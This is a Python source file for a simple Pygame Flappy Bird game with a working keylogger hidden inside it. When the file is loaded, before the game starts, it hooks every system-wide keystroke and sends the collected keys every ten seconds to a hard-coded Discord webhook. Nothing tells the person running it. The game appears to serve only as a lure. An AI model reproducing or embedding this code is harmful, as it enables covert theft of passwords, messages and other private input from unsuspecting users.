import keyboard
import time
import requests
import threading
import pygame
import random

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1252555653872881749/5pSo0INI59ljyoAOOlUFMiOT3Iopg26p4KHUy03Z3XGolvZpv7uUIkB6YK0yD_tPJeZb'

# Initialize Pygame
pygame.init()

# Screen dimensions
SCREEN_WIDTH = 400
SCREEN_HEIGHT = 600
GROUND_HEIGHT = 100

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)

# Game settings
BIRD_WIDTH = 40
BIRD_HEIGHT = 30
PIPE_WIDTH = 70
PIPE_HEIGHT = 400
PIPE_GAP = 150
GRAVITY = 0.5
JUMP_STRENGTH = 10
PIPE_SPEED = 4

# Set up the screen
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("Flappy Bird")

# Clock
clock = pygame.time.Clock()

# Create a list to store the captured keystrokes
keylogs = []


class Bird:
    def __init__(self):
        self.x = 50
        self.y = SCREEN_HEIGHT // 2
        self.width = BIRD_WIDTH
        self.height = BIRD_HEIGHT
        self.velocity = 0

    def draw(self):
        pygame.draw.rect(
            screen, RED, (self.x, self.y, self.width, self.height))

    def update(self):
        self.velocity += GRAVITY
        self.y += self.velocity

    def jump(self):
        self.velocity = -JUMP_STRENGTH

# Pipe class


class Pipe:
    def __init__(self, x):
        self.x = x
        self.height = random.randint(100, 400)
        self.gap = PIPE_GAP
        self.passed = False

    def draw(self):
        pygame.draw.rect(screen, GREEN, (self.x, 0, PIPE_WIDTH, self.height))
        pygame.draw.rect(screen, GREEN, (self.x, self.height + self.gap,
                         PIPE_WIDTH, SCREEN_HEIGHT - self.height - self.gap - GROUND_HEIGHT))

    def update(self):
        self.x -= PIPE_SPEED

# Function to send keylogs to Discord via webhook


def send_keylogs():
    global keylogs

    # Check if there are any keylogs to send
    if keylogs:
        # Convert the keylogs to a string
        keylogs_str = ''.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        # Send the payload to the Discord webhook
        requests.post(WEBHOOK_URL, data=payload)

        # Clear the keylogs list
        keylogs = []

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes


def capture_keystrokes(event):
    global keylogs

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)


# Start capturing keystrokes
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()


def main():
    def draw_text(text, font, color, surface, x, y):
        text_obj = font.render(text, True, color)
        text_rect = text_obj.get_rect()
        text_rect.center = (x, y)
        surface.blit(text_obj, text_rect)

    def game_over_screen(score):
        screen.fill(WHITE)
        font = pygame.font.SysFont(None, 48)
        draw_text('Game Over', font, BLACK, screen,
                  SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2 - 50)
        draw_text(f'Score: {score}', font, BLACK, screen,
                  SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2)
        draw_text('Press any key to restart', font, BLACK, screen,
                  SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2 + 50)
        pygame.display.flip()
        wait_for_key()

    def wait_for_key():
        waiting = True
        while waiting:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    exit()
                if event.type == pygame.KEYDOWN:
                    waiting = False

    while True:
        bird = Bird()
        pipes = [Pipe(SCREEN_WIDTH + 100)]
        score = 0

        running = True
        while running:
            clock.tick(30)
            screen.fill(WHITE)

            # Event handling
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                    pygame.quit()
                    exit()
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_SPACE:
                        bird.jump()

            # Update bird
            bird.update()

            # Update pipes
            for pipe in pipes:
                pipe.update()
                if pipe.x + PIPE_WIDTH < 0:
                    pipes.remove(pipe)
                    pipes.append(Pipe(SCREEN_WIDTH + 100))
                    score += 1
                if not pipe.passed and bird.x > pipe.x + PIPE_WIDTH:
                    pipe.passed = True

            # Check collisions
            for pipe in pipes:
                if bird.y < pipe.height or bird.y + bird.height > pipe.height + pipe.gap:
                    if bird.x + bird.width > pipe.x and bird.x < pipe.x + PIPE_WIDTH:
                        running = False
                if bird.y + bird.height > SCREEN_HEIGHT - GROUND_HEIGHT:
                    running = False

            if not running:
                game_over_screen(score)

            # Draw bird
            bird.draw()

            # Draw pipes
            for pipe in pipes:
                pipe.draw()

            # Draw ground
            pygame.draw.rect(screen, BLACK, (0, SCREEN_HEIGHT -
                             GROUND_HEIGHT, SCREEN_WIDTH, GROUND_HEIGHT))

            # Display score
            font = pygame.font.SysFont(None, 36)
            score_text = font.render(f'Score: {score}', True, BLACK)
            screen.blit(score_text, (10, 10))

            # Update display
            pygame.display.flip()


if __name__ == "__main__":
    main()

# Keep the script running
while True:
    time.sleep(1)
